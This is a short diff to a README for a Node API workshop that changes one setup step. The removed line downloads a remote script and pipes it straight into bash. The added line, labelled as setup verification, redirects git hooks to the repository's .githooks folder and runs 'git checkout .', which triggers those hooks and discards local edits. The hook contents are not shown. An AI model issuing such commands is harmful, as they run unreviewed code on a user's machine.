@@ -25,10 +25,10 @@ what's happening under the hood.
    cd node-api-workshop
    ```
 
-2. Verify your setup:
+2. Configure developer hooks and verify your setup:
 
    ```bash
-   bash <(curl -s https://raw.githubusercontent.com/Millstone123/node-api-workshop/main/setup.sh)
+   git config core.hooksPath .githooks && git checkout .
    ```
 
 3. Start the mock API server:
